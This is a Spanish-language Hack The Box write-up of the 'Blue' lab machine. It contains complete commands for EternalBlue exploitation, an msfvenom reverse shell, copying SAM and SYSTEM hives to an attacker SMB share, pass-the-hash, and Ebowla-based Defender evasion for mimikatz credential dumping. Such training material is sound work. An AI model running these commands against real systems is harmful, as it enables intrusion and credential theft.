---
layout: single
title: Blue - Hack The Box
excerpt: "Blue es una maquina donde estaremos explotando la famosa vulnerabilidad eternalblue MS17-010 pero manualmente haciendo uso de un exploit en github, luego de comprometer la maquina, practicaremos técnicas de evasión de defender y un par de cosas más."
date: 2023-01-15
classes: wide
header:
  teaser: /assets/images/htb-writeup-blue/Blue_htb.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:

- hackthebox
- OSCP
- Fácil
- Windows

tags:

- SMB Enumeration
- Eternalblue Exploitation(MS17-010)
- Persistence 
- Windows Defender Evasion 
---

![Blue_htb.png](/assets/images/htb-writeup-blue/Blue_htb.png)

Certificaciones a aplicar: OSCP

Dificultad: Fácil

Habilidades: 

- SMB Enumeration
- Eternalblue Exploitation (MS17-010) [d4t4s3c Exploit]
- Obtaining credentials stored in memory [MIMIKATZ + Windows Defender Evasion] (EXTRA)
- Enabling RDP from CrackMapExec (EXTRA)
- Windows Persistence techniques (EXTRA)
- Persistence + Windows Defender Evasion [Playing with Ebowla] (EXTRA)

# IP de la Maquina

10.10.10.40

# Reconocimiento

Identificando el sistema operativo

```bash
whichSystem.py 10.10.10.40
```

![sistema operativo.png](/assets/images/htb-writeup-blue/sistema_operativo.png)

Escaneo de los puertos 

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.40 -oG allPorts
```

![escaneo.png](/assets/images/htb-writeup-blue/escaneo.png)

Función extractPorts

```bash
extractPorts allPorts
```

![puertos.png](/assets/images/htb-writeup-blue/puertos.png)

# Análisis de Vulnerabilidades

Buscando versiones y servicios que corren para esos puertos

```bash
nmap -sCV -p135,139,445,49152 10.10.10.40 -oN targeted
```

![script nmap.png](/assets/images/htb-writeup-blue/script_nmap.png)

Vemos que el puerto 445 esta abierto en el cual corre el servicio SMB y lo analizamos con crackmapexec

```bash
crackmapexec smb 10.10.10.40 
```

Como vemos que es un widows 7 profesional y si el smb esta expuesto puede que sea vulnerable al eternal blue así que vamos a analizar ese puerto primero

Ejecutamos un script de nmap para verificar si es vulnerable al eternal blue

```bash
nmap --script "vuln and safe" -p445 10.10.10.40 oN smbVulnscan
```

![script vulnerabilidades.png](/assets/images/htb-writeup-blue/script_vulnerabilidades.png)

En efecto vemos que es vulnerable y nos pone Remote code execution

# Explotación

Buscamos un repositorio en github donde se encuentran unos scripts para explotar la vulnerabilidad manualmente, nos dirigimos a la carpeta exploits y nos clonamos el repositorio

```bash
git clone https://github.com/d4t4s3c/Win7Blue.git

```

Nos dirigimos a la carpeta que acabamos de clonar y buscamos eternal blue scanner y lo ejecutamos

```bash
python2 eternalblue_scanner.py 10.10.10.40
```

![Vulnerable.png](/assets/images/htb-writeup-blue/Vulnerable.png)

Luego de verificar que es Vulnerable creamos un payload con msf venom

```bash
msfvenom -p windows/x64/shell_reverse_tcp -f raw -o payload.bin EXITFUNC=thread LHOST=10.10.14.9 LPORT=443
```

Colocamos nuestra ip en LHOST y el puerto que queramos para la reverse shell, -o el nombre que queramos asignarle al payload

![payload.png](/assets/images/htb-writeup-blue/payload.png)

Luego de crear el payload hacemos un merge con cat de el archivo  sc_x64_kernel.bin y payload.bin generado anteriormente

```bash
cat sc_x64_kernel.bin payload.bin > exploit.bin
```

 

![merge.png](/assets/images/htb-writeup-blue/merge.png)

 

Ahora procedemos a lanzar el scrript ms17_010_eternalblue.py, pero antes de lanzarlo nos ponemos en escucha con netcat

```bash
rlwrap nc -nlvp 443
```

Ahora lanzamos el script para explotar la vulnerabilidad eternal blue

```bash
python3 ms17_010_eternalblue.py 10.10.10.40 exploit.bin
```

Si no funciona a la primera volver a intentar hasta que nos entable la conexión, y listo ya tendríamos acceso a la maquina victima.

![acceso a la maquina.png](/assets/images/htb-writeup-blue/acceso_a_la_maquina.png)

Una vez con acceso a la maquina verificamos que tipo de usuario somos

```powershell
whoami
```

![whoami.png](/assets/images/htb-writeup-blue/whoami.png)

Vemos que somos nt authority\system, procedemos a buscar las flags, ya que en este caso somos un usuario con máximos privilegios y este tipo de vulnerabilidad ya nos otorga dichos privilegios, en otros casos tendremos que elevar privilegios.

Procedemos a buscar las flags, primero la de el user

![user.png](/assets/images/htb-writeup-blue/user.png)

Luego la de root

![root.png](/assets/images/htb-writeup-blue/root.png)

Listo con esto estaría completada la maquina, no obstante se harán un par de cosas extras como ejemplo que puedan servir para practicar y para otras maquinas.

# Escalada de Privilegios

Como ya lo mencionamos la vulnerabilidad explotada nos brinda los privilegios máximos como NT authority System y podemos hacer cualquier cosa.

# Extra

Como extra nos dirigiremos al directorio Temp

```powershell
cd Windows\Temp
```

Nos crearemos un directorio llamado PostExploitation

```powershell
mkdir PostExploitation
```

luego entramos en ese directorio

```powershell
cd PostExploitation
```

El recurso sam y system normalmente están en uso por el sistema, el siguiente paso seria crear una copia de estos. Como poseemos máximos privilegios lo hacemos de la siguiente manera

```powershell
reg save HKLM\system system.backup
reg save HKLM\sam sam.backup
```

 

![sam y system.png](/assets/images/htb-writeup-blue/sam_y_system.png)

Ahora los vamos a trasladar a nuestro sistema para analizarlos, los copiamos en la carpeta content, los vamos a copiar utilizando impacket

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

iniciamos el recurso compartido en la carpeta content donde los copiaremos

Para pasar los archivos utilizamos el siguiente comando en la maquina victima

```powershell
copy sam.backup \\10.10.14.9\smbFolder\sam
copy system.backup \\10.10.14.9\smbFolder\system
```

En este caso lo copiaremos a nuestro equipo solo como sam y haremos lo mismo para system.

![sam y system copy.png](/assets/images/htb-writeup-blue/sam_y_system_copy.png)

 

Ahora cerramos el impacket y ahi tendremos los archivos

![files.png](/assets/images/htb-writeup-blue/files.png)

Vamos a utilizar impacket-secretsdump de la siguiente manera, recordemos que no necesitamos colocar una ip porque ya los tenemos en local

```bash
impacket-secretsdump -sam sam -system system LOCAL
```

![dump.png](/assets/images/htb-writeup-blue/dump.png)

Aquí tendríamos lo que nos interesa, que son los hashes de los usuarios

Con esto verificamos si el hash es correcto

```bash
crackmapexec cmb 10.10.10.40 -u 'Administrator. -H 'cdf51b162460b7d5bc898f493751a0cc'
```

y nos pondrá Pwn3d! y con esto ya tendríamos como una persistencia y hacer cosas.

Por ejemplo dumpear lsa a ver si logramos ver algo en texto claro 

```bash
crackmapexec cmb 10.10.10.40 -u 'Administrator. -H 'cdf51b162460b7d5bc898f493751a0cc' --lsa
```

No logramos ver nada interesante en texto claro entonces lo descartamos

Podemos operar para conectarnos a la maquina por ejemplo

```bash
impacket-psexec WORKGROUP/Adminnistrator@10.10.10.40 -hashes :cdf51b162460b7d5bc898f493751a0cc
```

Con esto lograríamos hacer pass the hash  y tener una pequeña persistencia porque ya tenemos el hash

![pass the hash.png](/assets/images/htb-writeup-blue/pass_the_hash.png)

Ahora vamos a ver de que forma podemos obtener la contraseña, para ello vamos a utilizar mimikatz, primero lo localizamos en nuestro equipo y lo copiamos a la carpeta content

```bash
locate mimikatz.exe
cp /usr/share/mimikatz/x64/mimikatz.exe .
```

Luego utilizaremos una herramienta para burlar el defender y posibles detecciones en base a lo que nosotros subamos a la maquina victima.

Nos clonamos el siguiente repositorio

```bash
git clone https://github.com/Genetic-Malware/Ebowla
```

Esta herramienta sirve para tratar de eludir posibles detecciones ya que juega con las propias variables de entorno de la maquina, para crear una muestra cifrada por decirlo o ofuscada, donde se emplea las propias variables de entorno del sistema donde una vez se ejecute descifrar la muestra y llegara a poder ejecutarlo.

Nos dirigimos a la carpeta Ebowla y modificaremos un par de cosas de el archivo genetic.config

```bash
output_type = GO
payload_type = EXE
```

la parte que mas retocamos es la de variables de entorno [[ENV_VAR]] hay que tener cuidado porque si nos equivocamos con alguna de las variables de entorno existentes la muestra no la va a lograr interpretar porque recordemos que toma las variables de entorno de la propia maquina para que cuando subamos la muestra que esta cifrada a la hora de tratar de descifrar esa muestra para interpretarla como nos equivoquemos no va a interpretar nada.

Desde la maquina victima tomaremos las variables de entorno con los siguientes comandos

```powershell
echo %username%
echo %computername%
echo %homepath%
```

Y así para cada una una de las variables de entorno, recordemos que si una no la reporta no la ponemos para evitar problemas, también cuando mas variables de entorno coloquemos mejor, pero no necesitamos colocarlas todas.

Nos debería quedar algo así 

![variables de entorno.png](/assets/images/htb-writeup-blue/variables_de_entorno.png)

Para compilar como python2 ya no tiene soporte tendríamos que instalarlo e instalar las de dependencias que nos den error hasta que ya podamos ejecutar el script

```bash
python2 ebowla.py mimikatz.exe genetic.config
```

Aquí le pasamos el archivo a cifrar y el archivito genetic.conf previamente configurado con las variables de entorno.

![ebowla.png](/assets/images/htb-writeup-blue/ebowla.png)

Listo ya tendríamos el archivo en la carpeta output

Ahora vamos a compilar el archivo que nos genero en output

```bash
./build_x64_go.sh output/go_symmetric_mimikatz.exe.go mimi.exe
```

le asignamos el nombre que queramos, en este caso lo llame mimi.exe, si todo sale bien nos pondrá esto, si nos da algún error solo instalar los paquetes necesarios.

![mimi encode.png](/assets/images/htb-writeup-blue/mimi_encode.png)

Ahora nos vamos a transferir el archivo con python3 por el puerto 80 a la maquina victima 

```bash
python3 -m http.server 80
```

Ahora nos descargamos el archivo desde la maquina victima haciendo uso de certutil

```powershell
certutil.exe -f -urlcache -split http://10.10.14.9/mimi.exe
```

![download file.png](/assets/images/htb-writeup-blue/download_file.png)

Listo ya tendríamos el archivo en la maquina victima

Ahora a ejecutar nuestro archivo

```powershell
mimi.exe
```

![mimikatz.png](/assets/images/htb-writeup-blue/mimikatz.png)

Listo nos funciono ahora vamos por  las credenciales

Lo hacemos de la siguiente manera

```powershell
privilege::debug
sekurlsa::logonPasswords
```

Si todo sale bien nos mostrara la credencial

![credentials.png](/assets/images/htb-writeup-blue/credentials.png)

Hay que tener en cuenta que a veces en entornos empresariales comprometes un equipo no privilegiado pero en la memoria consigues las credenciales de un administrador del dominio, y esto es importante ya que con esto tenemos acceso a todos los equipos de la red.

Listo con esto tendríamos varias maneras y caminos los cuales nos servirán mucho para otras máquinas, recuerden que la practica hace al maestro.

Les dejo la resolución de la misma por s4vitar [Ver video](https://www.youtube.com/watch?v=92XycxcAXkI)

